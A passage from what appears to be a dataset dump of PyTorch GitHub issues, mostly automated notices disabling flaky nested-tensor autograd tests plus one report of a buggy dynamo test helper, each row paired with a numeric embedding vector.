 -6.96182204e-03 -2.36891303e-02  1.45749092e-01 -2.22020410e-02
  4.51746881e-01 -2.65802294e-01  2.30021447e-01  2.46076986e-01
 -9.70879793e-02  3.14507067e-01  2.24111825e-02 -2.87832692e-04
 -6.35694116e-02  1.17228359e-01  8.76270384e-02  1.01078555e-01
  3.62585992e-01 -1.21242478e-01 -3.65057826e-01  1.39095023e-01
  1.31136671e-01 -1.84469789e-01 -4.03196096e-01 -1.25974253e-01
 -1.07063740e-01  4.43591550e-02 -3.38890217e-02 -3.21414359e-02
 -1.11186579e-01 -1.47361785e-01  3.26031037e-02 -1.07522950e-01
 -2.89352834e-01  5.78607559e-01  1.52305607e-02 -1.51904047e-01
  1.69810995e-01  5.53008988e-02  1.09271891e-01 -3.21049899e-01
 -1.03993230e-01 -1.42909251e-02  1.77137762e-01  1.81758776e-01
  2.23018065e-01  1.67631745e-01  3.96726914e-02 -4.23342921e-03
 -4.12931472e-01 -1.43975586e-01 -2.03036368e-02  4.08106506e-01
  1.55659378e-01  2.92605609e-02  1.77931309e-01  7.09995627e-01
 -2.08025724e-01 -1.63810655e-01 -2.16136366e-01 -3.19838703e-01
  3.06950539e-01 -1.99399620e-01  6.84318468e-02 -4.06956747e-02
  2.23347414e-02  2.49652728e-01 -3.23603332e-01  2.93116629e-01
 -1.60184652e-01  2.92737454e-01  9.17424709e-02 -1.33034825e-01
  1.01576068e-01 -2.18396589e-01 -7.88659304e-02 -2.40118764e-02
 -2.83922374e-01  8.74347165e-02 -1.18666142e-03  1.51273161e-01]"
DISABLED test_layer_norm_backward_5d_size_2_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_2_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18112962821).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_2_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.19763651  0.03850312 -0.16602147  0.02229374 -0.16770598 -0.2577412
 -0.00259255  0.2136266  -0.48804933 -0.11838537  0.39554703 -0.14667612
  0.40538993  0.10360756 -0.12181009 -0.02986188 -0.23695636 -0.09394298
  0.37252355  0.11012398 -0.10061503 -0.08628948 -0.23105314  0.30874985
  0.17763631  0.00376962 -0.23703489 -0.05863051  0.1892574   0.0862719
  0.17139353  0.11299482 -0.33038488 -0.05877925  0.5224221   0.17261058
 -0.0794975  -0.1614259  -0.40639168 -0.03125588  0.22577848  0.12549333
 -0.13367638 -0.08791688  0.20097646  0.01360593 -0.14039072  0.32560396
 -0.3152051  -0.26389477  0.2232114  -0.14483228 -0.03683682 -0.37758088
  0.04785321 -0.29846188  0.16688651  0.3491727   0.10121345  0.28180358
  0.10384313 -0.05644125 -0.07856967 -0.1054229  -0.06011285  0.07761181
  0.20616445 -0.16107947  0.31664175  0.07073383  0.16834599 -0.03810127
 -0.35959318 -0.03669712  0.2687571   0.17797345 -0.28758168  0.03418388
 -0.0854102  -0.11499999 -0.07720978  0.01088068  0.05437863  0.05547296
  0.07042524 -0.00753623  0.16393897 -0.07011821  0.10733678 -0.2374762
  0.35267985  0.19037583 -0.29842067  0.04898923 -0.10589131 -0.11331657
  0.19399792 -0.21575826 -0.2677548   0.17240694  0.22957829 -0.42803872
 -0.12805006  0.41590732 -0.16797361 -0.19408837  0.46540755  0.13205689
 -0.04850582 -0.08066731  0.17362382 -0.00982477 -0.06312692  0.08050319
  0.12857811 -0.09490038 -0.1901119  -0.13028643  0.0269001   0.48143566
 -0.18321228 -0.07677664  0.13809389 -0.13073131  0.35149103 -0.0325181
  0.06303497  0.01738592  0.14850262  0.10295548  0.10835096  0.24252705
 -0.19176546 -0.03934905  0.0534637   0.10803629 -0.12319662 -0.25891078
  0.04269992  0.05785777 -0.36833638  0.31088766  0.02155186 -0.25251108
  0.50473756  0.04683018 -0.28020805  0.15907928 -0.01898411  0.06480898
  0.04333628  0.03645545  0.26045993  0.17596234  0.13883549 -0.00548566
  0.19309968  0.05046592  0.10337909 -0.16144767 -0.03528405  0.3612693
 -0.15250406  0.07005618  0.24581969 -0.06591982 -0.46377635 -0.04025302
  0.02033636  0.16137505  0.05318091  0.02802081  0.19427443  0.03531849
  0.1212066  -0.23508453  0.09871323 -0.40723336 -0.05793481  0.24913156
  0.09888631 -0.05009393  0.24055481  0.07212252 -0.01537926  0.19213185
  0.28091723 -0.1054783   0.0290904  -0.09788702 -0.6802069  -0.17521459
  0.08080655  0.08156914 -0.21716401 -0.38266778  0.02931577 -0.0351428
 -0.07969777  0.05316033 -0.2505795   0.33497941  0.26285437 -0.04100131
  0.01625046  0.17308971 -0.18196163 -0.38754103  0.02666645  0.1323564
 -0.29071796 -0.12394562 -0.05227448 -0.4071625   0.02398676  0.17779621
  0.07413006 -0.0714203   0.00504358  0.18863182 -0.21935263 -0.07954998
 -0.3647852  -0.13899703 -0.47133198 -0.04333342 -0.22028926  0.4023689
 -0.0461111   0.07233196 -0.19427294 -0.06061077  0.18735223  0.04034679
  0.41809446 -0.39046344 -0.15490897 -0.07903094  0.06645381  0.50171125
 -0.63201743 -0.52439755 -0.03627028  0.02567147 -0.03498877  0.20139359
  0.03817572 -0.06728243 -0.0961003   0.12788366 -0.38617802 -0.29789594
  0.18982476 -0.04065825  0.06440318  0.29815304 -0.08586547  0.1646592
 -0.00747906 -0.00250652 -0.06281351  0.43105155 -0.1440993   0.48233476
  0.06667823  0.07423325 -0.14970465  0.03780084 -0.01933308 -0.13376382
  0.45208317 -0.7081578   0.0425775   0.12807006  0.141112   -0.13485926
  0.38957238  0.14781511 -0.04747844 -0.22822888  0.0473071   0.23808369
 -0.16199565 -0.09422828  0.27559295 -0.4262612  -0.14303905 -0.10649322
 -0.23854527 -0.15966916  0.02094982  0.2099289   0.0332559   0.00137184
 -0.41724357  0.15371458  0.28778312 -0.32231688 -0.01286535 -0.38496935
 -0.0472035   0.10167089  0.17281273 -0.24902895  0.00607728 -0.02117915
  0.16177383 -0.03707474  0.4500976  -0.25339636  0.23527819  0.240414
 -0.10576457  0.30992386  0.03795496 -0.0082747  -0.06446984  0.11070009
  0.09229733  0.11361887  0.35049677 -0.11513089 -0.34170943  0.1469416
  0.11332365 -0.17473051 -0.40804827 -0.08494206 -0.10157739  0.06718359
 -0.05966816 -0.02971014 -0.11266907 -0.15546674  0.04601442 -0.0848471
 -0.28277248  0.57595336  0.01859986 -0.15111044  0.17446823  0.05775342
  0.10784864 -0.3387106  -0.10801159 -0.01614065  0.18307853  0.15697742
  0.23109585  0.18365479  0.05951673 -0.02019737 -0.41829097 -0.15839449
 -0.05567278  0.4029507   0.13358448  0.01731302  0.16920957  0.705471
 -0.19231898 -0.16548367 -0.20991203 -0.285561    0.29959857 -0.17788124
  0.09608069 -0.05165983  0.0347533   0.23494649 -0.32154825  0.28169543
 -0.14857051  0.28308645  0.10627315 -0.13932484  0.1075805  -0.21457115
 -0.08385069 -0.02314918 -0.31409734  0.09947908 -0.04654317  0.15085518]"
DISABLED test_layer_norm_backward_5d_size_128_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_5d_size_128_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18105523198).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_5d_size_128_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.21498737  0.01742405 -0.1704869   0.02282321 -0.18027282 -0.26328826
 -0.04840048  0.22625387 -0.4843659  -0.10303929  0.39624912 -0.13339417
  0.3793214   0.07910126 -0.12639782 -0.0276428  -0.21136485 -0.11004846
  0.39413267  0.09549952 -0.10931884 -0.05507604 -0.23137788  0.30978152
  0.20075408 -0.00318877 -0.21477757 -0.04145139  0.18159887  0.08290905
  0.14697051  0.09360836 -0.28867725 -0.04911241  0.5347235   0.16630252
 -0.06878829 -0.18288001 -0.40592727 -0.01020795  0.21186396  0.1732456
 -0.11869621 -0.08110169  0.19575605  0.0211139  -0.1752057   0.2968947
 -0.32025212 -0.27629027  0.25891036 -0.11439407 -0.03968827 -0.36245942
  0.05253006 -0.3166768   0.1589909   0.35251045  0.0866333   0.31625536
  0.13477279 -0.09276277 -0.05940959 -0.13125966 -0.09449393  0.07949638
  0.22681995 -0.17349082  0.31737894  0.04373168  0.14035946 -0.04193703
 -0.35781574 -0.00696693  0.2701123   0.17305353 -0.2807303   0.04962493
 -0.10847902 -0.11456037 -0.08518793  0.01557564  0.06113876  0.07389798
  0.08761447 -0.02063894  0.16977996 -0.05747338  0.11205485 -0.23125637
  0.32970476  0.20347357 -0.34054753  0.03157551 -0.1265054  -0.13362086
  0.20583762 -0.2231516  -0.29988366  0.15915167  0.23703042 -0.41952294
 -0.16302592  0.40880853 -0.18102276 -0.20047963  0.4583909   0.15104844
 -0.05460235 -0.08594334  0.1916656   0.00344934 -0.06787516  0.05587215
  0.15643299 -0.11166251 -0.19717377 -0.14159346  0.0021442   0.49038732
 -0.20297404 -0.07782613  0.10800325 -0.12378369  0.3463936  -0.03284252
  0.06490114  0.0179725   0.16170804  0.0938175   0.11205955  0.24423078
 -0.16228214 -0.03915951  0.07562769  0.13492265 -0.11830904 -0.26046112
  0.0251047   0.04973058 -0.34365833  0.31136405  0.0414876  -0.26012915
  0.47161976  0.06428675 -0.29061747  0.1554502  -0.01125303  0.05681432
  0.05297898  0.0562226   0.2550326   0.16885972  0.12286374  0.00509814
  0.20966834  0.04364214  0.08692352 -0.17824125 -0.02071779  0.33838907
 -0.15001547  0.07615907  0.25925183 -0.06440048 -0.4814325  -0.03328322
  0.05273123  0.18011878  0.02904619  0.01303822  0.21873403  0.04882768
  0.1271691  -0.22875418  0.13994145 -0.39852852 -0.08080444  0.24732152
  0.10680617 -0.05318513  0.27328867  0.08608542 -0.0159848   0.19917145
  0.2649045  -0.0862514   0.042085   -0.10542418 -0.68461764 -0.1459507
  0.07224447  0.06998114 -0.21512026 -0.37997207  0.01489133 -0.03006233
 -0.0978431   0.0458633  -0.2658062   0.34268853  0.26805466 -0.00215389
 -0.01568947  0.18666828 -0.17096698 -0.38072628  0.03393955  0.13318282
 -0.28836507 -0.09578818 -0.05380412 -0.3987149   0.01271525  0.1856896
  0.07212356 -0.06764299  0.02998832  0.17039932 -0.20622884 -0.07848483
 -0.36745316 -0.14174125 -0.47405288 -0.04033844 -0.25386748  0.41185397
 -0.03251713  0.04893707 -0.18940642 -0.0521163   0.1801743   0.00248517
  0.4459652  -0.37652206 -0.18868333 -0.0717131   0.06514551  0.5192108
 -0.6551637  -0.5323411  -0.02374685  0.02021431 -0.02213012  0.17420533
  0.06271276 -0.06859515 -0.06701168  0.15305562 -0.37631142 -0.29485238
  0.19336644 -0.05501747  0.07759493  0.28489208 -0.06514288  0.2051386
 -0.02510525 -0.02594634 -0.08729254  0.45249653 -0.13868695  0.48410416
  0.07789951  0.07406737 -0.14831394  0.04067639 -0.02707113 -0.14623052
  0.47758624 -0.69438165  0.04163178  0.12480497  0.17002428 -0.13839501
  0.4236787   0.18210453 -0.04328751 -0.24997337  0.01935774  0.26071593
 -0.14128405 -0.08972757  0.3030258  -0.44644985 -0.15274456 -0.11734845
 -0.26359457 -0.14399703  0.02817667  0.20461613  0.01963949  0.01294647
 -0.41859758  0.14159803  0.31704903 -0.33204836 -0.02451982 -0.408934
 -0.04814951  0.102293    0.16102657 -0.23098421 -0.01419391 -0.03335898
  0.14048007 -0.03109661  0.48172277 -0.2523465   0.20960677  0.26574743
 -0.09530732  0.32713217  0.01546042 -0.00715853 -0.09268394  0.08475896
  0.08111541  0.09015682  0.36335444 -0.12603784 -0.38500887  0.14319918
  0.12605417 -0.16420348 -0.3985172  -0.11016511 -0.10171538  0.07347327
 -0.04069839 -0.03946997 -0.11923726 -0.15266678  0.05343045 -0.10843904
 -0.2577898   0.56929016  0.01830468 -0.14578807  0.16499268  0.06703067
  0.12000325 -0.32045722 -0.10459368 -0.02817208  0.19114338  0.18548684
  0.22737893  0.17588568  0.02364329 -0.03142251 -0.41317478 -0.15486205
 -0.02642792  0.41338742  0.14267206  0.02130627  0.18365124  0.6909686
 -0.20911047 -0.14367941 -0.22833106 -0.29760632  0.3134971  -0.18005322
  0.08239525 -0.03874442  0.01929295  0.2394812  -0.31065425  0.28173524
 -0.16841838  0.28335726  0.08885618 -0.13419834  0.08975273 -0.21564358
 -0.10947284 -0.00985409 -0.29966837  0.09472144 -0.03361391  0.14663689]"
[dynamo] standard_test() is buggy triaged oncall: pt2 module: dynamo,"I noticed this while trying to add types to `torch/_dynamo/testing.py`. This line always throws an error due to the call being passed the wrong number of arguments:

https://github.com/pytorch/pytorch/blob/94e90c199c6abb188d1d86244621b9e94e43598c/torch/_dynamo/testing.py#L255

However, fixing that causes tests to fail, because this line was previously never executed:

https://github.com/pytorch/pytorch/blob/94e90c199c6abb188d1d86244621b9e94e43598c/torch/_dynamo/testing.py#L258

I'm not sure whether the test failures are bogus.

cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519 @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @chenyang78 @aakhundov @kadeng",False,"[-6.41033173e-01  6.16359152e-03 -2.81709079e-02 -3.98494713e-02
  2.76075266e-02 -2.99085200e-01  2.21527338e-01  1.61038756e-01
 -3.46997738e-01 -9.30303112e-02  1.54775500e-01 -5.05815372e-02
  2.96222359e-01 -1.05734408e-01  2.49485135e-01 -1.31384790e-01
 -4.76255529e-02 -5.95923185e-01 -4.59611043e-03 -8.79925787e-02
 -6.42533526e-02 -2.01424025e-03 -3.25334102e-01  2.35346645e-01
 -3.07945490e-01 -4.28209640e-02 -2.70738155e-01 -1.03431471e-01
  1.18067041e-02  4.76284444e-01  5.72696421e-03  4.21551973e-01
 -4.00653869e-01  5.35094887e-02  2.74868488e-01  2.43681699e-01
 -6.21418357e-02 -6.14194348e-02 -2.77012289e-01  6.20341748e-02
  1.48269504e-01 -2.37550586e-01  1.52182907e-01 -1.17757365e-01
  2.49233410e-01  3.75482328e-02 -9.40249488e-02  2.10607350e-01
 -2.85021305e-01 -3.84577326e-02  1.47706985e-01  9.88573059e-02
  1.63647294e-01 -2.98529744e-01  6.13272116e-02 -2.79618800e-01
  2.22522467e-01  5.72769463e-01  6.62290305e-02 -9.85399485e-02
 -1.47239178e-01 -1.84333146e-01 -1.38454333e-01 -1.42640918e-02
 -1.21385902e-01 -2.23414034e-01  3.22747491e-02  1.35222729e-02
  5.84205031e-01  1.73408315e-01  1.85879599e-02 -1.21028632e-01
  6.00727126e-02 -9.05056745e-02 -6.92844391e-02 -7.90604018e-03
 -2.91981459e-01 -8.71171132e-02 -8.44262391e-02 -2.95853913e-01
  1.05326295e-01 -1.71824038e-01 -1.89859308e-02 -2.34717026e-01
  2.25887746e-01 -4.51988056e-02  1.69323474e-01  7.64105320e-02
  3.98386121e-01  9.56467241e-02  5.25386572e-01 -1.79537982e-01
  8.62453282e-02  2.19286323e-01 -1.65309891e-01  4.94718462e-01
  2.13597178e-01 -3.31630737e-01 -2.10497394e-01  1.73090070e-01
 -1.36997014e-01 -6.71539903e-01 -4.16882336e-01  1.86988920e-01
 -1.44505665e-01 -1.32616282e-01  1.21916659e-01  3.86469364e-02
  1.87868327e-01 -3.57512265e-01  2.61376381e-01 -1.65224612e-01
 -1.14923000e-01  5.17872646e-02  1.96609020e-01 -5.96791282e-02
 -2.37425029e-01 -1.99944258e-01 -1.37014955e-01  3.29209715e-01
  7.38853663e-02 -9.18377787e-02  5.53939957e-03 -4.11065742e-02
  2.36428112e-01 -5.55462316e-02  3.05592388e-01  2.45622158e-01
 -2.74573527e-02  6.55954108e-02 -2.00876117e-01 -2.18451440e-01
 -3.15023750e-01  2.27150559e-01  1.30244091e-01  3.10461164e-01
  2.60943264e-01  4.01701778e-02  4.54817861e-02 -7.99722821e-02
 -2.31707200e-01  1.51283339e-01  3.50773007e-01 -3.26007068e-01
 -1.29090901e-03 -1.38258293e-01 -2.96411306e-01  2.03189775e-01
 -1.86841823e-02 -5.54210544e-02  4.77261245e-02 -5.43413088e-02
  7.21331909e-02  6.20223582e-01  1.61435425e-01  3.16611826e-02
  2.32914835e-01  1.94378003e-01  3.99614155e-01 -1.09523453e-01
  1.20186292e-01  2.80390114e-01  6.15800731e-02  8.04138929e-02
  5.38070500e-02  9.45295542e-02 -6.01517856e-01 -3.86668116e-01
 -1.72391176e-01  2.09724382e-02 -2.48531401e-01  1.58923283e-01
  1.41622618e-01 -1.03914678e-01 -1.85928151e-01  4.27473336e-04
 -8.93804729e-02 -1.59453183e-01 -1.85405046e-01  5.42535305e-01
  8.38041082e-02  3.73213470e-01  4.59700167e-01  3.78642261e-01
  4.17744033e-02  4.27327096e-01  2.98631132e-01 -1.84723645e-01
  9.57979783e-02 -6.46220222e-02 -3.71431023e-01 -1.81937546e-01
  2.54880786e-01  1.88544597e-02 -6.16352856e-02 -9.62473601e-02
  2.19063893e-01 -2.46448874e-01  1.20928474e-02 -8.50675255e-02
 -2.00567648e-01  6.71738207e-01  2.23312587e-01 -1.48414046e-01
  2.94993162e-01  3.94363463e-01 -5.55754714e-02 -5.48938870e-01
 -9.73747969e-02  3.45015943e-01 -1.61743164e-01 -1.07353553e-02
 -5.02860211e-02 -2.45127499e-01  1.40148222e-01  4.01423872e-01
 -2.19344243e-01 -4.07546729e-01  8.30489844e-02  3.07757318e-01
 -5.22444099e-02 -1.69393476e-02 -1.69236153e-01 -4.57460821e-01
 -2.13301808e-01  4.27511960e-01 -2.17395663e-01 -1.18529126e-02
  7.03297555e-02 -1.94144309e-01 -1.56013548e-01 -2.97039509e-01
  2.92934120e-01  4.09469068e-01  4.72902328e-01 -1.58219755e-01
 -4.82020080e-01  4.41776440e-02  5.42625070e-01 -8.24104995e-02
 -5.34096539e-01 -3.93356472e-01 -4.67042364e-02  1.30017176e-01
 -5.20533249e-02  1.36104897e-01 -1.73323393e-01 -1.50191694e-01
 -3.43640685e-01  1.03405833e-01 -5.66643104e-02 -2.70614922e-01
 -2.12018281e-01  1.32641852e-01  3.96763384e-01  1.79878667e-01
  3.86124626e-02  1.47597134e-01  2.07281038e-01 -3.63224804e-01
  3.28193605e-01  1.80748105e-01 -1.17630132e-01  5.13139274e-03
  1.95796236e-01  2.11970717e-01  4.96732220e-02  2.79520929e-01
 -4.40219790e-01 -1.12250663e-01  4.32007611e-01 -5.97071052e-01
  1.13407999e-01  1.74746066e-01  3.95840287e-01 -3.63773942e-01
  1.34435654e-01  9.10508335e-02 -3.05773497e-01 -1.92179322e-01
  1.67494565e-01  1.24534115e-01 -2.20598534e-01 -9.38209966e-02
  4.65282291e-01 -9.24291536e-02 -2.72918463e-01 -3.30626033e-02
 -2.82514721e-01 -4.36710775e-01 -1.77841093e-02  2.08836734e-01
  4.22790438e-01 -5.67082688e-03 -4.30683315e-01  5.62813655e-02
  1.34968966e-01 -2.42639571e-01  2.01609492e-01 -1.37879372e-01
 -3.44096005e-01 -8.97673815e-02  5.35115488e-02 -1.52201265e-01
 -2.53123999e-01 -4.41223755e-02  3.06057036e-01  1.26821563e-01
  4.35816556e-01 -4.35897350e-01  1.35140866e-01  3.18828583e-01
 -1.05935976e-01  3.56037229e-01  1.63973942e-01  4.42140438e-02
 -3.15919071e-01  4.06421036e-01 -4.65255044e-02  1.75915852e-01
  4.24626321e-02 -3.64997119e-01 -2.68515408e-01 -5.23569807e-02
  2.77862847e-01 -4.67796884e-02 -6.73270464e-01 -2.36207679e-01
 -1.60915345e-01 -6.29070029e-03  2.21922249e-02 -1.38137162e-01
 -2.77717888e-01 -1.24625251e-01 -7.60901067e-03  4.98051196e-02
 -1.45395398e-01  3.18946630e-01  3.79820392e-02 -1.66264236e-01
 -1.05707392e-01  1.15865275e-01  2.93160170e-01 -2.03261018e-01
 -1.75901219e-01  8.79495516e-02 -1.43593671e-02 -6.00857176e-02
  8.44225846e-03 -2.32307896e-01  6.26191050e-02  2.19921947e-01
 -7.22495019e-02 -3.14785205e-02  6.76930547e-02  5.53941488e-01
  1.19246550e-01  2.73085356e-01  4.11856592e-01  3.49232465e-01
 -1.57491118e-01 -4.13257554e-02 -2.64988691e-01  5.36497906e-02
  2.67890990e-01  5.93760684e-02  1.33104175e-01 -2.99236864e-01
 -3.30102026e-01  1.37768343e-01 -5.94637930e-01  1.22631036e-01
  3.02847121e-02  6.08175658e-02  3.70979965e-01 -2.68880725e-01
  5.53304888e-02 -1.07069030e-01 -1.49904549e-01  6.73725158e-02
 -3.25417757e-01  2.29675502e-01  1.11922540e-01  8.49518329e-02]"
DISABLED test_indexing_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_indexing_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18100110014).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_indexing_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.3088474  -0.00087599 -0.09665052  0.0993205   0.05619033 -0.4622327
 -0.03206767  0.08922689 -0.35053825 -0.1617178   0.31245512 -0.0284935
  0.26125464  0.08871828 -0.1883561  -0.14468972 -0.1033878  -0.11964834
  0.45492688  0.10719542 -0.3228085  -0.03699363 -0.19373822  0.20767805
  0.21956584 -0.00824356 -0.20866594 -0.02783691 -0.01117826  0.08179284
  0.22300555  0.04018135 -0.29755244  0.01309896  0.47775346  0.2395302
 -0.02183685 -0.17853001 -0.3252672  -0.16716877  0.20890936 -0.01369261
 -0.01234085 -0.08553748  0.26075652 -0.04171011 -0.20114736  0.17282397
 -0.23118617 -0.14955653  0.00328872 -0.12498017 -0.01908515 -0.5122738
  0.11973326 -0.04185978  0.1361607   0.435887    0.13598111  0.19793624
  0.16690817 -0.02085385 -0.15022476 -0.07288351  0.04849602 -0.02143884
  0.2168703  -0.291438    0.40545687 -0.04081827  0.24306633 -0.09288928
 -0.26258016 -0.0890235   0.12492847  0.21632119 -0.2860429   0.03137628
 -0.02344667 -0.09805726 -0.07633188  0.00223112  0.04937852  0.13023138
  0.16730902  0.04444844  0.2069352  -0.07202716  0.3486032  -0.25450617
  0.24671674  0.01846625 -0.2085313  -0.08085115 -0.03442947 -0.07257071
  0.2822256  -0.03842575 -0.2997319   0.18298268  0.11075252 -0.38362643
 -0.03531623  0.29719886 -0.21923706 -0.26963586  0.3871769   0.12430108
  0.04722787 -0.12191126  0.19599465  0.07294531 -0.05499081  0.05093428
  0.06309795 -0.09733284 -0.05804312 -0.19717471  0.11553563  0.6310122
 -0.31703252 -0.09465405  0.09702037 -0.05922015  0.28654003  0.05365802
 -0.07468243  0.07136057  0.10225727  0.00799592  0.04274146  0.06364551
 -0.25335562 -0.17100334  0.0630388  -0.01960207 -0.10318015 -0.25307614
  0.04965677  0.15663931 -0.20505199  0.21439627 -0.0096895  -0.17376047
  0.214784    0.03547487 -0.1039689   0.1088749  -0.07531349 -0.00136955
 -0.01735292  0.01242485  0.26469955  0.48778498  0.01168994  0.00598668
  0.30658334  0.15070318  0.21706216 -0.0994577  -0.01376319  0.46512884
 -0.18099016  0.07696353  0.28670165 -0.155593   -0.41018683  0.06320812
 -0.11985852  0.20779246 -0.10748285 -0.12396805  0.09943108  0.01406734
 -0.0006912  -0.10323589  0.3574238  -0.37950748 -0.12366468  0.16261639
  0.06840556 -0.06148745  0.17507839  0.1538255   0.02382591  0.20034745
  0.19685414 -0.03312004 -0.00843332 -0.07947405 -0.586229   -0.1951738
 -0.00605843  0.0284901  -0.21301422 -0.20562465  0.02399233 -0.03568889
 -0.10476945  0.01275366 -0.10980573  0.31800455  0.2654936  -0.04760583
 -0.03944314  0.07251681 -0.28438687 -0.420481    0.11140198  0.09100595
 -0.19747336 -0.137891    0.03254589 -0.26810312 -0.07940151  0.05508052
 -0.05653422  0.04661286  0.00300815  0.25149283 -0.34440982 -0.07291202
 -0.29540503 -0.12827148 -0.36659646 -0.16934934 -0.20825177  0.25021538
 -0.12744287 -0.08058459 -0.1708281  -0.27090782  0.19457763 -0.0643851
  0.28954518 -0.18294924 -0.20283575 -0.02882998  0.06581204  0.5756873
 -0.5250662  -0.53608763 -0.06738004  0.1579076   0.00161168  0.19274606
 -0.06165788 -0.11400392 -0.17740998  0.01664363  0.00114196 -0.29775858
  0.09041212 -0.13891777  0.09646211  0.39352137 -0.07785159  0.17596601
  0.03111869  0.08959122 -0.03495552  0.3196591  -0.03712898  0.38048658
  0.17971864  0.11336824 -0.12756382  0.0052158  -0.00946321 -0.13327253
  0.35910478 -0.54606247 -0.03200399  0.07053649  0.22505814 -0.16869907
  0.41025308  0.10189423 -0.08103427 -0.09223636  0.20717755  0.16203232
 -0.24817824 -0.00436811  0.13353804 -0.3187096  -0.08715533  0.03301975
 -0.29732203 -0.01949333 -0.08109981  0.14000045  0.10310362 -0.04043221
 -0.35376716  0.06561672  0.25788137 -0.29654282  0.08878757 -0.16236602
 -0.13065594  0.01673227  0.12973303 -0.2729428   0.05660265  0.02697998
  0.10879574 -0.0377342   0.34773305 -0.2639431   0.03799171  0.30583578
 -0.16878319  0.16020502  0.1045846  -0.01175    -0.16905305  0.20054439
 -0.09733417  0.1825829   0.24977711 -0.12067054 -0.4090208   0.28893363
  0.18723273  0.0181768  -0.3146455   0.0238841  -0.11767796  0.03978077
 -0.0845648  -0.17407797 -0.21122041 -0.13180834  0.11767405 -0.16634949
 -0.15818751  0.4599223  -0.01206008 -0.19975647  0.1342458   0.07184642
  0.10170165 -0.22039068 -0.12267665  0.04766624  0.17399985  0.18743248
  0.18927565  0.21466221 -0.13250528  0.0687667  -0.34195334 -0.18919414
 -0.02774029  0.5002557   0.23210236  0.12517244  0.2519127   0.5341708
 -0.06345402 -0.17013517 -0.31423903 -0.2210028   0.15138665 -0.0529178
 -0.09585287 -0.04001567  0.23537673  0.15973684 -0.36172086  0.08554783
 -0.08617204  0.18532452  0.18733868 -0.17494094  0.12531449 -0.30041713
 -0.00184977  0.0610622  -0.03307538  0.07136355 -0.03450704  0.24887314]"
DISABLED test_gelu_backward_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_gelu_backward_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18083003357).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 9 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_gelu_backward_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.51600170e-01 -1.45690143e-03 -6.45599291e-02  3.06797586e-02
 -9.46164429e-02 -3.86881292e-01  1.05525777e-02  1.27972573e-01
 -3.95247757e-01 -2.27532879e-01  3.58007252e-01 -8.39501321e-02
  2.28017315e-01  6.62943646e-02  3.46213207e-03 -1.52002797e-01
 -8.94193947e-02 -1.08198002e-02  4.31473821e-01  9.50222462e-02
